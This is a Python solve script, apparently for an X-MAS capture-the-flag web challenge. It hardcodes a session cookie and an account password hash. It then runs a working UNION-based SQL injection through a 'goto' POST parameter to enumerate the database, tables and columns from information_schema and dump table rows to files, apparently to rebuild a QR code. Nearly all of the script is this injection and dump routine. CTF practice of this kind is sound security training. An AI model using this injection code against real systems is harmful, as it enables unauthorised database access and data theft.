import requests
import re
import base64
from urllib.parse import quote_from_bytes, unquote_plus
import threading
import time
import sys
'''4(4)%9use the Elf account to access the deep database we will work with for this month.

Management'''
TARGET_URL = 'http://challs.xmas.htsp.ro:3001'
phash = '7f26e9f397b8ddaadacfa62e098dbdf1'
uname = 'Elf'
tables = []
cols = {}


def getBase1():
    headers = {
        "Cookie": "PHPSESSID=a9hejgfsd3uffv1c3646o2bmiq"
    }
    res = requests.get(f"{TARGET_URL}/",headers=headers)
    res = res.text
    str = re.findall(r"<!--<td class=\"STAGING_COLUMN\">(.*?)</td>-->", res)
    # print(str)

    base = ""
    for i in str:
        base = base+i

    base = base64.b64decode(base).decode('utf-8')
    print(base)


def getBase2():
    headers = {
        "Cookie": "PHPSESSID=a9hejgfsd3uffv1c3646o2bmiq"
    }
    res = requests.get(f"{TARGET_URL}/",headers=headers)
    res = res.text
    str = re.findall(
        r"</td><td class=\"STAGING_COLUMN\">(.*?)</td></tr>-->", res)
    # print(str)
    base = ""
    for i in str:
        base = base+i

    base = base64.b64decode(base).decode('utf-8')
    print(base)


def sqli(query):
    payload = f"' union select {query}-- "
    data = {
        "goto": payload
    }
    headers = {
        "Cookie": "PHPSESSID=a9hejgfsd3uffv1c3646o2bmiq"
    }
    res = requests.post(f"{TARGET_URL}/redirect.php",
                        data=data, allow_redirects=False, headers=headers)
    if(res.status_code == 301):
        loc = res.headers['Location'][1:-5]
        loc = unquote_plus(loc)
        return loc
    if(res.status_code == 503):
        time.sleep(1)
        sqli(query)

    return None


def getTables():
    database = sqli("database()")
    if(database != None):
        payload = f"GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables where table_schema=\"{database}\""
        res = sqli(payload)
        if(res != None):
            for i in res.split(', '):
                tables.append(i)

    return tables


def getColumns(table_name):
    database = sqli("database()")
    if(database != None):
        payload = f"GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns where table_name=\"{table_name}\""
        res = sqli(payload)
        if(res != None):
            col = []
            for i in res.split(', '):
                col.append(i)
            cols[table_name] = col

    return cols


def getTable(table_name):
    table = []
    payload = f"COUNT(*) FROM {table_name}"
    count = sqli(payload)
    if(count != None):
        count = int(count)
    else:
        return None

    if (table_name not in cols):
        getColumns(table_name)

    if (table_name in cols):
        col = cols[table_name]
        conc = ""
        for i in range(0, len(col)):
            conc = conc+", \";;;;\", "+col[i]
        conc = conc[len(", \";;;;\", "):]
        for i in range(0, count):
            payload = f"CONCAT({conc}) FROM {table_name} limit 1 offset {i}"
            res = sqli(payload)
            if(res == None):
                continue
            j = 0
            table_i = {}
            for i in res.split(";;;;"):
                table_i[col[j]] = i
                j += 1

            table.append(table_i)
            # print(table)

        return table
        


def countCols(table_name):
    payload = f"count(column_name) FROM information_schema.columns where table_name=\"{table_name}\""
    cols = sqli(payload)
    return cols


def countRows(table_name):
    payload = f"count('1') FROM {table_name}"
    cols = sqli(payload)
    return cols

table_info = [1]*1853
with open('dump.txt','r') as f:
    lines=f.readlines()
    i=0
    for line in lines:
        i+=1
        info = line.split(' ')
        info[2]=info[2].strip()
        id = re.findall(r'ORDER_ID(.*?)_',info[0])
        id = int(id[0])
        table_info[id]=[info[0],int(info[1]),int(info[2])]

f = open('qr1.txt','w')
for info in table_info:
        entry = str(info[2])*info[1]
        print(entry)
        f.write(entry+'\n')
        
#getBase1()
#getBase2()

print()
'''
table_info = [1]*1853
with open('dump.txt','r') as f:
    lines=f.readlines()
    i=0
    for line in lines:
        i+=1
        info = line.split(' ')
        info[2]=info[2].strip()
        id = re.findall(r'ORDER_ID(.*?)_',info[0])
        id = int(id[0])
        table_info[id]=[info[0],int(info[1]),int(info[2])]

#print(getTable('toy_manufacturing_district_IDTOP4Fd_ORDER_ID1_SPECc5HD'))

f = open('qr.txt','w')
for info in table_info:
    if info[2]>0:
        tbl=getTable(info[0])
        for i in tbl:
            entry=""
            for k,v in i.items():
                entry=entry+v
            entry=entry.replace('LOL','0')
            print(entry)
            f.write(entry+'\n')
    else:
        entry='0'*info[1]
        print(entry)
        f.write(entry+'\n')

 '''           

'''

table_info = {}
with open('tables.txt', 'r') as f:
    lines = f.readlines()
    for line in lines:
        if(line.count("santas_db.toy_manufacturing_district_") > 0):
            manu.append(line[len('\'santas_db.\'')-1:-3])
        else:
            table.append(line[len('\'santas_db.\'')-1:-3])

#print(table)
for i in manu:
    cols_cnt = countCols(i)
    row_cnt = countRows(i)
    table_info[i]=[cols_cnt,row_cnt]
    print(i,cols_cnt,row_cnt)
    
with open('dump.txt','w') as f:
    for k,v in table_info.items():
        c = v[0]
        r = v[1]
        f.write(f"{k} {c} {r}\n")
        '''
